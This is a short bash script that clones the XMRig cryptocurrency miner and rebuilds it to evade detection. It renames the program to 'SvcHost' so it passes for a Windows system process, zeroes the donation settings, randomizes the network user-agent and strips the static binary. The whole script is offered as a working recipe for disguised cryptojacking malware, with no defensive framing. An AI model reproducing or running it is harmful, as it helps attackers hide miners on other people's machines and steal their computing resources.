#!/bin/bash
git clone https://github.com/xmrig/xmrig.git && cd xmrig

# Strip all identifiable strings
sed -i 's/XMRig/SvcHost/g' src/version.h
sed -i 's/xmrig\.com/localhost/g' src/donate.h
sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/' src/donate.h
sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/' src/donate.h

# Randomize the internal user-agent
UA=$(head -c 16 /dev/urandom | xxd -p)
sed -i "s/\"XMRig\/[^\"]*\"/\"Mozilla\/$UA\"/" src/base/net/stratum/Client.cpp

# Compile static, stripped, with randomized optimization
mkdir build && cd build
cmake .. -DWITH_TLS=OFF -DWITH_HTTPD=OFF \
         -DCMAKE_C_FLAGS="-O2 -ffunction-sections -fdata-sections" \
         -DCMAKE_EXE_LINKER_FLAGS="-static -Wl,--gc-sections"
make -j$(nproc)
strip --strip-all xmrig

sha256sum xmrig
